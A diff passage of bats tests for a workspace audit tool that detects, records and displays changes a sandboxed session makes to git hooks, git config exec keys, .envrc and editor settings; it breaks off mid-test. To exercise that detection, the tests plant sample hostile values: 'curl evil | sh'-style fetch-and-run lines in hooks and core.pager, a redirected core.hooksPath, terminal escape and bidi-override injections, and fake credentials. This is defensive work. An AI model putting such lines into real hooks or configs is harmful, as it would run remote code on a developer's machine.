@@ -961,3 +961,719 @@ REPORT
     [ -f "$BASEDIR/$slug" ]
     ! grep -q '^spam gitconfig:core.hooksPath' "$BASEDIR/$slug"
 }
+
+# --- issue #57: the workspace argument is optional ---
+
+@test "show finds the workspace when run from the repo root" {
+    snap
+    printf 'x\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    run bash -c "cd '$WS' && '$AUDIT' show 2>/dev/null"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *".envrc"* ]]
+}
+
+@test "show finds the workspace when run from a subdirectory" {
+    mkdir -p "$WS/src/deep"
+    snap
+    printf 'x\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    run bash -c "cd '$WS/src/deep' && '$AUDIT' show 2>/dev/null"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *".envrc"* ]]
+}
+
+@test "show finds the parent repo when run from a linked worktree" {
+    # The sandbox's own workflow: work happens in WORKSPACE/.worktrees/<branch>,
+    # but bin/dejima mounted (and keyed the reports to) the parent repo. A
+    # worktree-local lookup would report "no reports" while the startup
+    # warning kept firing on the parent's.
+    git -C "$WS" commit -q --allow-empty -m init
+    git -C "$WS" worktree add -q "$WS/.worktrees/wt" -b wt
+    snap
+    printf 'x\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    run bash -c "cd '$WS/.worktrees/wt' && '$AUDIT' show 2>/dev/null"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *".envrc"* ]]
+}
+
+@test "show finds the parent repo's report even after the worktree itself was snapshotted" {
+    # snapshot alone now creates the workspace's .staging/ dir, report or
+    # not - resolve_ws() must not mistake that for evidence of a report, or
+    # it stops at the worktree candidate before ever trying the parent.
+    git -C "$WS" commit -q --allow-empty -m init
+    git -C "$WS" worktree add -q "$WS/.worktrees/wt" -b wt
+    snap
+    printf 'x\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    "$AUDIT" snapshot "$WS/.worktrees/wt" "$(mktemp)"
+    run bash -c "cd '$WS/.worktrees/wt' && '$AUDIT' show 2>/dev/null"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *".envrc"* ]]
+}
+
+@test "show names the path it resolved when that workspace has no reports" {
+    # A wrong guess must be visible, not silent - the operator has to be able
+    # to tell "nothing happened here" from "you are looking at the wrong repo".
+    other="$(mktemp -d)"; git -C "$other" init -q
+    run bash -c "cd '$other' && '$AUDIT' show 2>&1"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"no reports for"* ]]
+    [[ "$output" == *"$other"* ]]
+    rm -rf "$other"
+}
+
+@test "an explicit workspace argument still wins over detection" {
+    snap
+    printf 'x\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    other="$(mktemp -d)"; git -C "$other" init -q
+    run bash -c "cd '$other' && '$AUDIT' show '$WS' 2>/dev/null"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *".envrc"* ]]
+    rm -rf "$other"
+}
+
+# --- issue #57: ack must show the content it is asking about ---
+
+# Later tasks add a sidecar directory of retained diffs beside each report.
+# These tests are about the no-retention fallback specifically, so they
+# remove it - which is a no-op today and stays correct afterwards.
+no_sidecar() { rm -rf "$AUDITDIR"/*/*.d; }
+
+@test "ack shows the content of the file it asks to approve" {
+    snap
+    printf 'export SECRET_FLAG=planted\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    no_sidecar
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"export SECRET_FLAG=planted"* ]]
+}
+
+@test "ack shows the value of the git config key it asks to approve" {
+    # The finding's own body line already carries the value (it's not
+    # opaque like a file-content finding), so asserting on the whole output
+    # would pass even with render_finding never called. Scope the assertion
+    # to the content block itself to actually exercise this task's code.
+    snap
+    git -C "$WS" config core.hooksPath /tmp/evil
+    cmp_ >/dev/null
+    no_sidecar
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    after_marker="${output#*--- no pre-session record; current content ---}"
+    [ "$after_marker" != "$output" ]
+    [[ "$after_marker" == *"/tmp/evil"* ]]
+}
+
+@test "control characters in a git config key are stripped from the source hint" {
+    # source_hint's gitconfig arm builds a "git config --get <key>" hint
+    # from the decoded raw id ($rid) - a crafted subsection name (still a
+    # valid CRITICAL finding via filter.*.smudge) must go through sanitize
+    # here exactly like the tcb/default arms already do, not reach the
+    # terminal verbatim.
+    mkdir -p "$WS/.git"
+    snap
+    printf '[filter "evil\033[31mx"]\n\tsmudge = cat\n' >> "$WS/.git/config"
+    cmp_ >/dev/null
+    no_sidecar
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"full value: git -C"* ]]
+    [[ "$output" != *$'\033'* ]]
+}
+
+@test "ack renders a symlinked hook as its target, matching how it is hashed" {
+    mkdir -p "$WS/.git/hooks"
+    snap
+    ln -s /tmp/evil-target "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    no_sidecar
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"-> /tmp/evil-target"* ]]
+}
+
+@test "ack can approve a dangling symlink it just displayed, and the approval is recorded" {
+    # current_content_for_id and current_sha_for_id must agree that a
+    # dangling symlink (target does not exist) still counts as present -
+    # otherwise the operator approves content they were just shown and is
+    # told the surface vanished, and the CRITICAL report can never clear.
+    mkdir -p "$WS/.git/hooks"
+    snap
+    ln -s /tmp/does-not-exist-anywhere "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    no_sidecar
+    slug="$(printf '%s' "$WS" | sed 's/[^a-zA-Z0-9]/-/g')"
+    run bash -c "printf 'a\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"-> /tmp/does-not-exist-anywhere"* ]]
+    [[ "$output" != *"no longer exists"* ]]
+    grep -q '^safe \.git/hooks/pre-commit ' "$BASEDIR/$slug"
+}
+
+@test "control characters in displayed content are stripped" {
+    # The whole reason sanitize() exists: content is workspace-controlled and
+    # lands in a terminal. An ESC here could clear the screen or repaint the
+    # prompt the operator is about to answer.
+    mkdir -p "$WS/.git/hooks"
+    snap
+    printf '#!/bin/sh\n\033[2Jcurl evil\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    no_sidecar
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"curl evil"* ]]
+    [[ "$output" != *$'\033'* ]]
+}
+
+@test "a bidi override in displayed content is stripped" {
+    mkdir -p "$WS/.git/hooks"
+    snap
+    printf '#!/bin/sh\necho \xe2\x80\xaereversed\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    no_sidecar
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"reversed"* ]]
+    [[ "$output" != *$'\xe2\x80\xae'* ]]
+}
+
+@test "displayed content is capped and points at the real file" {
+    mkdir -p "$WS/.git/hooks"
+    snap
+    seq 1 500 > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    no_sidecar
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"more line(s)"* ]]
+    [[ "$output" == *".git/hooks/pre-commit"* ]]
+    [[ "$output" != *"499"* ]]
+}
+
+# --- issue #57: pre-session staging, inside the store and nowhere else ---
+
+stage_root() { printf '%s/%s/.staging' "$AUDITDIR" "$(printf '%s' "$WS" | sed 's/[^a-zA-Z0-9]/-/g')"; }
+staged_dirs() { find "$(stage_root)" -mindepth 1 -maxdepth 1 -type d 2>/dev/null; }
+key_of() { printf '%s' "$1" | sha256sum | cut -d' ' -f1; }
+
+@test "snapshot stages pre-session content inside the audit store" {
+    mkdir -p "$WS/.git/hooks"
+    printf 'original\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    d="$(staged_dirs | head -1)"
+    [ -n "$d" ]
+    [ -f "$d/$(key_of '.git/hooks/pre-commit')" ]
+    grep -q original "$d/$(key_of '.git/hooks/pre-commit')"
+}
+
+@test "snapshot writes nothing under TMPDIR" {
+    # Staging is the one place whole files (not diffs) exist on disk. /tmp is
+    # world-writable and survives an uncleaned exit, so it must never be used.
+    t="$(mktemp -d)"
+    mkdir -p "$WS/.git/hooks"; printf 'original\n' > "$WS/.git/hooks/pre-commit"
+    TMPDIR="$t" "$AUDIT" snapshot "$WS" "$STATE"
+    [ -z "$(find "$t" -mindepth 1 2>/dev/null)" ]
+    rm -rf "$t"
+}
+
+@test "snapshot records the staging path as the first section of the state file" {
+    snap
+    head -1 "$STATE" | grep -q '^### staging /'
+    # The existing section ranges are anchored at ### gitconfig and
+    # ### statusline, so putting staging first must leave them untouched.
+    grep -q '^### gitconfig$' "$STATE"
+    grep -q '^### statusline$' "$STATE"
+}
+
+@test "denylisted surfaces are never staged, not even transiently" {
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    printf '{}\n' > "$WS/.mcp.json"
+    mkdir -p "$WS/.claude"; printf '{}\n' > "$WS/.claude/settings.local.json"
+    printf '{}\n' > "$WS/.claude/settings.json"
+    snap
+    d="$(staged_dirs | head -1)"
+    [ ! -e "$d/$(key_of '.envrc')" ]
+    [ ! -e "$d/$(key_of '.mcp.json')" ]
+    [ ! -e "$d/$(key_of '.claude/settings.local.json')" ]
+    # ...but the shared, commonly-committed settings.json still is
+    [ -f "$d/$(key_of '.claude/settings.json')" ]
+}
+
+@test "a nested dotenv file is never staged, matched on basename rather than exact path" {
+    # hash_paths() walks .claude/, .vscode/ and .git/hooks/ recursively, so a
+    # dotenv file can appear nested (e.g. .claude/.env) - the exact-path
+    # denylist arm only ever matches the un-nested form and would miss it.
+    mkdir -p "$WS/.claude"
+    printf 'SECRET=1\n' > "$WS/.claude/.env"
+    printf 'SECRET=2\n' > "$WS/.claude/.env.production"
+    printf '{}\n' > "$WS/.claude/settings.json"
+    snap
+    d="$(staged_dirs | head -1)"
+    [ -n "$d" ]
+    [ ! -e "$d/$(key_of '.claude/.env')" ]
+    [ ! -e "$d/$(key_of '.claude/.env.production')" ]
+    # ...but an ordinary sibling file still is
+    [ -f "$d/$(key_of '.claude/settings.json')" ]
+}
+
+@test "nothing is staged when the audit store is inside the workspace" {
+    # The store is only out of the sandbox's reach while it is outside the
+    # mounted workspace. Inside it, retained content is readable AND
+    # deletable from within the container, so none is produced.
+    mkdir -p "$WS/.git/hooks"; printf 'original\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIR="$WS/audit" "$AUDIT" snapshot "$WS" "$STATE"
+    [ -z "$(find "$WS/audit" -type f 2>/dev/null)" ]
+}
+
+@test "nothing is staged when the audit store is a relative path resolving inside the workspace" {
+    # store_reachable must canonicalise both sides before comparing - a
+    # relative DEJIMA_AUDIT_DIR (resolved against cwd) can land inside $ws
+    # just as easily as an absolute one, and the raw-string comparison used
+    # to miss it entirely.
+    mkdir -p "$WS/.git/hooks"; printf 'original\n' > "$WS/.git/hooks/pre-commit"
+    bash -c "cd '$WS' && DEJIMA_AUDIT_DIR=audit '$AUDIT' snapshot '$WS' '$STATE'"
+    [ -z "$(find "$WS/audit" -type f 2>/dev/null)" ]
+}
+
+@test "staging still happens when the audit store's parent tree does not exist yet (fresh install)" {
+    # readlink -f requires every path component but the last to already
+    # exist, and nothing creates $AUDIT_DIR's tree ahead of snapshot on a
+    # clean-history host (compare only mkdir -p's it on a real finding; ack
+    # creates $BASELINE_DIR). setup()'s mktemp -d for AUDITDIR masks this -
+    # point at a genuinely missing parent instead.
+    fresh="$AUDITDIR/nonexistent-parent/audit"
+    mkdir -p "$WS/.git/hooks"; printf 'original\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIR="$fresh" "$AUDIT" snapshot "$WS" "$STATE"
+    slug="$(printf '%s' "$WS" | sed 's/[^a-zA-Z0-9]/-/g')"
+    d="$(find "$fresh/$slug/.staging" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | head -1)"
+    [ -n "$d" ]
+    [ -f "$d/$(key_of '.git/hooks/pre-commit')" ]
+}
+
+@test "nothing is staged when DEJIMA_AUDIT_DIFFS=0" {
+    mkdir -p "$WS/.git/hooks"; printf 'original\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIFFS=0 "$AUDIT" snapshot "$WS" "$STATE"
+    [ -z "$(staged_dirs)" ]
+}
+
+@test "a file over the staging cap is not staged, while a smaller file in the same run still is" {
+    # The previous version of this test asserted only the negative, which
+    # passed vacuously (staged_dirs empty -> $d empty -> the -e check is
+    # trivially true) even before any staging existed at all.
+    mkdir -p "$WS/.claude"
+    printf 'small\n' > "$WS/.claude/small.md"
+    head -c 2000000 /dev/zero | tr '\0' 'a' > "$WS/.claude/big.md"
+    snap
+    d="$(staged_dirs | head -1)"
+    [ -n "$d" ]
+    [ -f "$d/$(key_of '.claude/small.md')" ]
+    [ ! -e "$d/$(key_of '.claude/big.md')" ]
+}
+
+@test "a staging directory whose owner is dead is reaped on the next snapshot" {
+    mkdir -p "$(stage_root)/orphan"
+    # PID 2**22 + 1 is above every Linux pid_max, so it cannot be live.
+    printf '4194305:1\n' > "$(stage_root)/orphan/.owner"
+    snap
+    [ ! -d "$(stage_root)/orphan" ]
+}
+
+@test "a staging directory whose owner is alive is left alone" {
+    # A concurrent dejima session against the same workspace must not have its
+    # staging deleted out from under it.
+    mkdir -p "$(stage_root)/live"
+    sleep 30 &
+    live=$!
+    printf '%s:%s\n' "$live" "$(bash -c 'st=$(cat /proc/'"$live"'/stat); r=${st##*) }; set -- $r; echo ${20}')" \
+        > "$(stage_root)/live/.owner"
+    snap
+    [ -d "$(stage_root)/live" ]
+    kill "$live" 2>/dev/null || true
+}
+
+@test "a staging directory with no owner record is reaped only once it is old" {
+    mkdir -p "$(stage_root)/nameless"
+    snap
+    [ -d "$(stage_root)/nameless" ]      # fresh: liveness undecidable, keep
+    touch -d '2 days ago' "$(stage_root)/nameless"
+    snap
+    [ ! -d "$(stage_root)/nameless" ]    # stale: reap
+}
+
+# --- issue #57: what actually persists after the session ---
+
+sidecar() { local r; r="$(find "$AUDITDIR" -name '*.txt' | sort | tail -1)"; r="${r%-CRITICAL.txt}"; r="${r%.txt}"; printf '%s.d' "$r"; }
+
+@test "a modified surface retains a bounded diff, not the whole file" {
+    mkdir -p "$WS/.git/hooks"
+    seq 1 300 > "$WS/.git/hooks/pre-commit"
+    snap
+    seq 1 300 > "$WS/.git/hooks/pre-commit"
+    printf 'curl evil | sh\n' >> "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of '.git/hooks/pre-commit').diff"
+    [ -f "$f" ]
+    grep -q 'curl evil' "$f"
+    # bounded by the change, not by the file: the 300 unchanged lines are not
+    # in the store.
+    [ "$(wc -l < "$f")" -lt 20 ]
+    ! grep -qx '150' "$f"
+}
+
+@test "the staging directory is gone after compare" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf 'b\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    [ -z "$(staged_dirs)" ]
+}
+
+@test "compare removes the staging directory even when it exits early" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    d="$(staged_dirs | head -1)"
+    [ -n "$d" ]
+    # No findings at all: compare takes its early `exit 0` path.
+    cmp_ >/dev/null
+    [ ! -d "$d" ]
+}
+
+@test "a newly created surface retains a marker and no content" {
+    snap
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    [ -f "$(sidecar)/$(key_of '.envrc').new" ]
+    [ ! -s "$(sidecar)/$(key_of '.envrc').new" ]
+}
+
+@test "a removed surface retains nothing of what it contained" {
+    # A deletion diff IS the whole file, which is exactly the dump this
+    # design exists to avoid - and a removed hook does not run, so it is the
+    # least interesting case anyway.
+    mkdir -p "$WS/.git/hooks"; printf 'secret payload\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    rm "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    [ -f "$(sidecar)/$(key_of '.git/hooks/pre-commit').removed" ]
+    ! grep -rq 'secret payload' "$(sidecar)"
+}
+
+@test "a denylisted surface retains a reason instead of a diff" {
+    printf 'export TOKEN=old\n' > "$WS/.envrc"
+    snap
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of '.envrc').withheld"
+    [ -f "$f" ]
+    grep -qi 'secret-bearing' "$f"
+    ! grep -rq 'hunter2' "$(sidecar)"
+}
+
+@test "a credential in a changed non-denylisted file suppresses retention" {
+    mkdir -p "$WS/.claude"; printf '{}\n' > "$WS/.claude/settings.json"
+    snap
+    printf '{"env":{"KEY":"sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAA"}}\n' > "$WS/.claude/settings.json"
+    cmp_ >/dev/null
+    [ -f "$(sidecar)/$(key_of '.claude/settings.json').withheld" ]
+    ! grep -rq 'sk-ant-' "$(sidecar)"
+}
+
+@test "an oversized change retains a reason instead of a diff" {
+    mkdir -p "$WS/.claude"; printf 'x\n' > "$WS/.claude/notes.md"
+    snap
+    seq 1 5000 > "$WS/.claude/notes.md"
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of '.claude/notes.md').withheld"
+    [ -f "$f" ]
+    grep -qi 'too large' "$f"
+}
+
+@test "binary content retains a reason instead of a diff" {
+    mkdir -p "$WS/.claude"; printf 'x\n' > "$WS/.claude/blob.bin"
+    snap
+    printf 'a\000b\000c\n' > "$WS/.claude/blob.bin"
+    cmp_ >/dev/null
+    grep -qi 'binary' "$(sidecar)/$(key_of '.claude/blob.bin').withheld"
+}
+
+@test "a changed git config value retains its before and after" {
+    git -C "$WS" config core.pager 'less'
+    snap
+    git -C "$WS" config core.pager 'curl evil | sh'
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of 'gitconfig:core.pager').diff"
+    [ -f "$f" ]
+    grep -q 'less' "$f"
+    grep -q 'curl evil' "$f"
+}
+
+@test "no diffs are retained when the store is inside the workspace" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIR="$WS/audit" "$AUDIT" snapshot "$WS" "$STATE"
+    printf 'curl evil\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIR="$WS/audit" "$AUDIT" compare "$WS" "$STATE" >/dev/null 2>&1
+    ! grep -rq 'curl evil' "$WS/audit"
+    # The REASON, not just the absence: without the store_reachable arm this
+    # finding still lands on the "no pre-session copy" withhold (nothing was
+    # staged either), so an absence-only assertion passes with the gate gone.
+    w="$(find "$WS/audit" -name '*.withheld')"
+    [ -n "$w" ]
+    grep -q 'store is inside the mounted workspace' "$w"
+}
+
+@test "no diffs are retained when DEJIMA_AUDIT_DIFFS=0" {
+    mkdir -p "$WS/.git/hooks"; printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIFFS=0 "$AUDIT" snapshot "$WS" "$STATE"
+    printf 'curl evil\n' > "$WS/.git/hooks/pre-commit"
+    DEJIMA_AUDIT_DIFFS=0 "$AUDIT" compare "$WS" "$STATE" >/dev/null 2>&1
+    ! grep -rq 'curl evil' "$AUDITDIR"
+    # No sidecar AT ALL, not merely no content in it: with the DIFFS_ENABLED
+    # gate deleted the directory is still created and filled with withheld
+    # reasons, which the grep above would not notice.
+    [ -z "$(find "$AUDITDIR" -name '*.d' -type d)" ]
+}
+
+@test "rotation removes a report's retained diffs along with the report" {
+    export DEJIMA_AUDIT_KEEP=1
+    mkdir -p "$WS/.claude"
+    for i in 1 2 3; do
+        printf 'v%s\n' "$i" > "$WS/.claude/notes.md"
+        snap
+        printf 'v%s-changed\n' "$i" > "$WS/.claude/notes.md"
+        cmp_ >/dev/null
+        sleep 1
+    done
+    # One clean report survives rotation, and exactly one sidecar with it.
+    [ "$(find "$AUDITDIR" -name '*.txt' | wc -l)" -le 2 ]
+    [ "$(find "$AUDITDIR" -maxdepth 2 -name '*.d' -type d | wc -l)" \
+      -le "$(find "$AUDITDIR" -name '*.txt' | wc -l)" ]
+}
+
+@test "an uppercase-named credential is caught by the retention screen" {
+    # .claude/settings.json is deliberately outside diff_denied(), so
+    # looks_secret() is the ONLY net over its env block - and that block
+    # names its credentials in upper case. A case-sensitive keyword match put
+    # live tokens in the store in cleartext. The value here matches no
+    # vendor-prefix alternative, so only the case-insensitive keyword arm can
+    # catch it.
+    mkdir -p "$WS/.claude"; printf '{}\n' > "$WS/.claude/settings.json"
+    snap
+    printf '{"env":{"NPM_TOKEN":"xY12abcd9999"}}\n' > "$WS/.claude/settings.json"
+    cmp_ >/dev/null
+    [ -f "$(sidecar)/$(key_of '.claude/settings.json').withheld" ]
+    ! grep -rq 'xY12abcd9999' "$(sidecar)"
+}
+
+@test "an exec key the session made multi-valued never retains an empty diff" {
+    # git executes the LAST value of a multi-valued key, but
+    # gitconfig_value_for_key returns the first match over a SORTED snapshot,
+    # so a comparison here would have both sides resolve to 'less' and come
+    # out empty. An empty .diff is worse than none once ack prefers the
+    # retained diff over live content: the operator would be shown a blank
+    # before/after for a CRITICAL exec-key change. Either side being
+    # multi-valued is the signal that no honest comparison is available.
+    git -C "$WS" config core.pager 'less'
+    snap
+    git -C "$WS" config --add core.pager 'zsh'
+    run cmp_
+    [[ "$output" == *"core.pager"* ]]
+    f="$(sidecar)/$(key_of 'gitconfig:core.pager')"
+    [ ! -e "$f.diff" ]
+    grep -qi 'multiple values' "$f.withheld"
+}
+
+@test "a multi-valued exec key never retains a fabricated diff" {
+    # Two pre-session values (git resolves to 'bbb'), one appended by the
+    # session ('zzz-evil', which git now runs). promote_gitconfig's before
+    # loop collects BOTH pre-session values, so comparing built a diff saying
+    # 'bbb' was removed - nothing was removed, and zzz-evil, the value git
+    # will execute, appeared nowhere in it. Approving that diff pinned
+    # sha256("aaa") and let the report shed its -CRITICAL protection.
+    git -C "$WS" config core.pager 'aaa'
+    git -C "$WS" config --add core.pager 'bbb'
+    snap
+    git -C "$WS" config --add core.pager 'zzz-evil'
+    run cmp_
+    [[ "$output" == *"core.pager=zzz-evil"* ]]
+    f="$(sidecar)/$(key_of 'gitconfig:core.pager')"
+    [ ! -e "$f.diff" ]
+    grep -qi 'multiple values' "$f.withheld"
+    # Nothing claiming a pre-session value was removed reaches the prompt.
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"multiple values"* ]]
+    [[ "$output" != *"before (pre-session)"* ]]
+    [[ "$output" != *"-bbb"* ]]
+}
+
+@test "a re-quoted config value says the comparison came out empty" {
+    # The remaining route to an empty diff now that multi-valued keys never
+    # reach one: the config file's TEXT changed (git_config_snapshot compares
+    # raw lines, so this is a finding) while unquote_value flattens both
+    # sides back to the same string. A 0-byte .diff would show the operator a
+    # blank before/after for a CRITICAL exec-key change.
+    git -C "$WS" config core.pager 'less'
+    snap
+    sed -i 's/pager = less/pager = "less"/' "$WS/.git/config"
+    run cmp_
+    [[ "$output" == *"core.pager"* ]]
+    f="$(sidecar)/$(key_of 'gitconfig:core.pager')"
+    [ ! -e "$f.diff" ]
+    grep -qi 'compared equal' "$f.withheld"
+}
+
+@test "a huge current-side file is capped before it is copied into TMPDIR" {
+    # Every cap in this design used to apply AFTER the bytes were on disk, so
+    # `compare` - which runs from bin/dejima's EXIT trap, on a size the
+    # session chooses - copied the whole current file into $TMPDIR just to
+    # produce a marker. $TMPDIR is frequently a tmpfs, which makes that "a
+    # session filled the host's RAM at exit", and a SIGKILL mid-compare leaves
+    # the copy behind (cleanup_staging covers BEFORE_DIR only).
+    mkdir -p "$WS/.claude"; printf 'x\n' > "$WS/.claude/notes.md"
+    snap
+    # Sparse: making it costs nothing, copying it costs 200 MB.
+    truncate -s 200M "$WS/.claude/notes.md"
+    tmp="$(mktemp -d)"; peak="$(mktemp)"
+    : > "$tmp/.running"
+    ( while [ -e "$tmp/.running" ]; do
+          find "$tmp" -maxdepth 1 -type f ! -name '.running' -printf '%s\n' \
+              >> "$peak" 2>/dev/null
+          sleep 0.02
+      done ) & watcher=$!
+    TMPDIR="$tmp" "$AUDIT" compare "$WS" "$STATE" >/dev/null 2>&1
+    rm -f "$tmp/.running"; wait "$watcher" 2>/dev/null || true
+    # The size gate fired instead of the copy. Without it this lands on
+    # 'binary content' (the file is all NULs) - having written 200 MB to
+    # find that out.
+    grep -qi 'too large' "$(sidecar)/$(key_of '.claude/notes.md').withheld"
+    max="$(sort -n "$peak" | tail -1)"; max="${max:-0}"
+    [ "$max" -le 1048576 ]
+    rm -rf "$tmp" "$peak"
+}
+
+@test "retained diffs are capped by a per-report budget, and exhausting it is reported" {
+    mkdir -p "$WS/.claude"
+    # Lines of 'aaaa ' rather than solid 'a': a 40+ run of base64 characters
+    # trips looks_secret, which would withhold every diff and never reach the
+    # budget at all.
+    a="$(yes 'aaaa' | head -200 | tr '\n' ' ')"
+    b="$(yes 'bbbb' | head -200 | tr '\n' ' ')"
+    for i in $(seq 1 20); do
+        for j in $(seq 1 30); do printf '%s\n' "$a"; done > "$WS/.claude/f$i.md"
+    done
+    snap
+    for i in $(seq 1 20); do
+        for j in $(seq 1 30); do printf '%s\n' "$b"; done > "$WS/.claude/f$i.md"
+    done
+    run cmp_
+    # Said in the exit-time summary...
+    [[ "$output" == *"retention budget spent after"* ]]
+    [[ "$output" == *"ABNORMAL"* ]]
+    # ...and in the report itself.
+    grep -q 'retention budget spent after' "$(find "$AUDITDIR" -name '*.txt' | head -1)"
+    # Budget actually held: what was kept is under it, and the rest said why.
+    [ "$(cat "$(sidecar)"/*.diff | wc -c)" -le 1048576 ]
+    grep -lq 'budget' "$(sidecar)"/*.withheld
+}
+
+@test "retained markers and reasons are not world-readable" {
+    umask 022
+    printf 'export TOKEN=old\n' > "$WS/.envrc"
+    snap
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    [ "$(stat -c %a "$(sidecar)/$(key_of '.envrc').withheld")" = 600 ]
+}
+
+@test "a surface too large to have been staged says so instead of claiming to be new" {
+    # Over STAGE_FILE_CAP, so snapshot staged nothing for it - but it existed,
+    # and calling it new would promise there is no earlier version to compare
+    # against.
+    mkdir -p "$WS/.claude"
+    head -c 2000000 /dev/zero | tr '\0' 'a' > "$WS/.claude/big.md"
+    snap
+    head -c 2000000 /dev/zero | tr '\0' 'b' > "$WS/.claude/big.md"
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of '.claude/big.md')"
+    [ ! -e "$f.new" ]
+    grep -q 'no pre-session copy' "$f.withheld"
+}
+
+@test "a git config exec key set for the first time retains a marker, not a diff" {
+    snap
+    git -C "$WS" config core.hooksPath /tmp/evil
+    cmp_ >/dev/null
+    f="$(sidecar)/$(key_of 'gitconfig:core.hooksPath')"
+    [ -f "$f.new" ]
+    [ ! -s "$f.new" ]
+    [ ! -e "$f.diff" ]
+}
+
+# --- issue #57: the prompt shows the retained diff ---
+
+@test "ack shows a before/after diff for a modified surface" {
+    mkdir -p "$WS/.git/hooks"
+    printf '#!/bin/sh\nexec make lint\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf '#!/bin/sh\nexec make lint\ncurl -s evil.sh | sh\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"before (pre-session)"* ]]
+    [[ "$output" == *"+curl -s evil.sh | sh"* ]]
+}
+
+@test "ack labels a new surface as new and shows all of it" {
+    snap
+    printf 'export EVIL=1\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"new surface"* ]]
+    [[ "$output" == *"export EVIL=1"* ]]
+}
+
+@test "ack explains why a denylisted surface has no diff, and still shows it" {
+    # The tension worth being explicit about: .envrc is a CRITICAL surface, so
+    # this is a finding where a diff would help most. The operator can still
+    # decide - the live content is on their own terminal - but the persistent
+    # store goes without.
+    printf 'export TOKEN=old\n' > "$WS/.envrc"
+    snap
+    printf 'export TOKEN=hunter2\n' > "$WS/.envrc"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"secret-bearing"* ]]
+    [[ "$output" == *"hunter2"* ]]
+}
+
+@test "a control character planted in a diff is stripped before display" {
+    mkdir -p "$WS/.git/hooks"
+    printf '#!/bin/sh\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf '#!/bin/sh\n\033[2Jcurl evil\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    run bash -c "printf 'q\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"curl evil"* ]]
+    [[ "$output" != *$'\033'* ]]
+}
+
+@test "acknowledging a finding removes its retained diff" {
+    # The diff existed to inform a decision that has now been made. An
+    # unacknowledged CRITICAL report is retained indefinitely by design; its
+    # diff should not be.
+    mkdir -p "$WS/.git/hooks"
+    printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
+    printf 'b\n' > "$WS/.git/hooks/pre-commit"
+    cmp_ >/dev/null
+    sc="$(sidecar)"
+    [ -f "$sc/$(key_of '.git/hooks/pre-commit').diff" ]
+    run bash -c "printf 'a\n' | '$AUDIT' ack '$WS'"
+    [[ "$output" == *"recorded 1 acknowledgement"* ]]
+    [ ! -e "$sc/$(key_of '.git/hooks/pre-commit').diff" ]
+}
+
+@test "quitting ack leaves the retained diffs in place" {
+    mkdir -p "$WS/.git/hooks"
+    printf 'a\n' > "$WS/.git/hooks/pre-commit"
+    snap
